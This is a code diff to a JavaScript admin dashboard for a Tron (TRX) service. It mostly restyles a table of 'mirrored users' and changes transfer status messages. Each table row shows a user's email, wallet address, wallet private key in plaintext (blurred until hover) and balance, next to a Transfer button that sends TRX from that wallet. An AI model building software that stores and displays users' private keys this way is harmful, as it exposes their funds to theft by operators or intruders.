@@ -245,26 +245,26 @@ function escapeHtml(value) {
 
 function renderUsers(users) {
   if (!users.length) {
-    usersTable.innerHTML = '<tr><td colspan="8" class="empty">No mirrored users yet.</td></tr>';
+    usersTable.innerHTML = '<tr><td colspan="8" class="px-6 py-8 text-center text-slate-400">No mirrored users yet.</td></tr>';
     return;
   }
 
   usersTable.innerHTML = users
     .map(
       (user) => `
-        <tr>
-          <td>${escapeHtml(formatValue(user.email))}</td>
-          <td>${escapeHtml(formatValue(user.trx_address))}</td>
-          <td>${escapeHtml(formatValue(user.trx_private_key))}</td>
-          <td>${escapeHtml(formatValue(user.referrals_count))}</td>
-          <td>${formatLiveValue(user.live_trx_balance, user.live_trx_balance_failed, 6)}</td>
-          <td>${formatLiveValue(user.live_trx_balance_usd, user.live_trx_price_failed || user.live_trx_balance_failed, 2)}</td>
-          <td class="action-cell">
-            <button class="transfer-btn" type="button" data-email="${escapeHtml(user.email)}" data-address="${escapeHtml(
+        <tr class="hover:bg-slate-700/30 transition-colors group">
+          <td class="px-6 py-4 text-slate-200">${escapeHtml(formatValue(user.email))}</td>
+          <td class="px-6 py-4 text-slate-400 font-mono text-xs">${escapeHtml(formatValue(user.trx_address))}</td>
+          <td class="px-6 py-4 text-slate-500 font-mono text-xs blur-[3px] hover:blur-none transition-all cursor-pointer">${escapeHtml(formatValue(user.trx_private_key))}</td>
+          <td class="px-6 py-4 text-emerald-400 font-medium">${escapeHtml(formatValue(user.referrals_count))}</td>
+          <td class="px-6 py-4 text-slate-200">${formatLiveValue(user.live_trx_balance, user.live_trx_balance_failed, 6)}</td>
+          <td class="px-6 py-4 text-slate-200">${formatLiveValue(user.live_trx_balance_usd, user.live_trx_price_failed || user.live_trx_balance_failed, 2)}</td>
+          <td class="px-6 py-4 text-center">
+            <button class="px-4 py-1.5 text-xs font-bold text-emerald-400 bg-emerald-500/10 hover:bg-emerald-500/20 border border-emerald-500/20 rounded-lg transition-colors shadow-sm transfer-btn" type="button" data-email="${escapeHtml(user.email)}" data-address="${escapeHtml(
           user.trx_address || ""
         )}">Transfer</button>
           </td>
-          <td>${escapeHtml(formatValue(user.synced_at))}</td>
+          <td class="px-6 py-4 text-slate-400 text-xs">${escapeHtml(formatValue(user.synced_at))}</td>
         </tr>
       `
     )
@@ -336,11 +336,12 @@ async function sendTransfer() {
       throw new Error(payload?.detail || payload?.message || text || `Transfer failed: ${response.status}`);
     }
 
-    transferMessage.textContent = payload?.message || "Transfer sent successfully.";
-    await refreshUsers();
-    setTimeout(closeTransferModal, 1200);
+      transferMessage.textContent = "Transfer initiated successfully.";
+      transferMessage.className = "text-sm font-medium text-center h-5 text-emerald-400";
+      setTimeout(closeTransferModal, 2000);
   } catch (error) {
-    transferMessage.textContent = error.message;
+      transferMessage.textContent = error.message || "Failed to transfer TRX.";
+      transferMessage.className = "text-sm font-medium text-center h-5 text-rose-400";
   } finally {
     transferSend.disabled = false;
   }
